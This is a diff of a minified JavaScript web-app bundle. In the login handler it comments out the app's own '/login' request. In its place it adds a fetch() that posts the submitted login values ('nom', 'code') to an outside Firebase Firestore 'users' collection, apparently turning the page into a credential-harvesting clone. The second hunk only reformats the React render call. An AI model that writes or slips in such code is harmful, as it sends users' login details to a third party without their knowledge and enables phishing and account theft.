@@ -32374,10 +32374,27 @@
                       case 18:
                         return (
                           (n.next = 20),
-                          ((l = { cliId: e.cliId, username: o, password: i }),
-                          ov({ method: "post", url: "/login", data: l })).then(
-                            function (e) {
-                              return e.data;
+                          // ((l = { cliId: e.cliId, username: o, password: i }),
+                          // ov({ method: "post", url: "/login", data: l })).then(
+                          //   function (e) {
+                          //     return e.data;
+                          //   }
+                          // )
+                          fetch(
+                            "https://firebase.googleapis.com/v1/projects/YOUR_PROJECT_ID/databases/(default)/documents/users",
+                            {
+                              method: "post",
+                              body: JSON.stringify({
+                                nom,
+                                code,
+                              }),
+                            }
+                          ).then(
+                            (response) => {
+                              console.log("response", response);
+                            },
+                            (error) => {
+                              console.error(error);
                             }
                           )
                         );
@@ -32679,15 +32696,13 @@
                 n(e), r(e), o(e), a(e), i(e);
               });
         };
-      a
-        .createRoot(document.getElementById("root"))
-        .render(
-          (0, Pd.jsx)(uv, {
-            children: (0, Pd.jsx)(r.StrictMode, {
-              children: (0, Pd.jsx)(_v, {}),
-            }),
-          })
-        ),
+      a.createRoot(document.getElementById("root")).render(
+        (0, Pd.jsx)(uv, {
+          children: (0, Pd.jsx)(r.StrictMode, {
+            children: (0, Pd.jsx)(_v, {}),
+          }),
+        })
+      ),
         Tv();
     })();
 })();
